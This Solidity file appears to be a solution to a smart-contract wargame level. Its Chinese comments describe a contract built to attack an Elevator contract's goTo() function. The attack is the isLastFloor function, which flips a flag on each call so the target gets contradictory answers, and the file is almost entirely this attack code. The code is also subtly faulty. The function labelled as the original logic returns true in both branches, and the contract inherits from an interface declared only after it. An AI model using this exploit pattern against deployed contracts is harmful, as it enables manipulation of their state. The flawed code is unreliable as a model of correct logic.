// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyBuilding is Building{
    uint256 public top_floor = 13;
    IElevator public target;
    bool public isTop;

    constructor(address _target) {
        target = IElevator(_target);
        isTop = true;
    }

    // 應該是正常原始的 isLastFloor 邏輯
    function isLastFloorOriginal(uint256 _floor) external returns (bool) {
        if (_floor == top_floor){
            return true;
       }
       return true;
    }

    // 為了進攻電梯合約的 goTO() 而存在的函數
    function isLastFloor(uint256 _floor) external override returns (bool) {
        isTop = !isTop;
        return isTop;
    }

    function goTo(uint256 _floor) public{
        target.goTo(_floor);
    }
}

interface IElevator {
    function goTo(uint256) external;
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}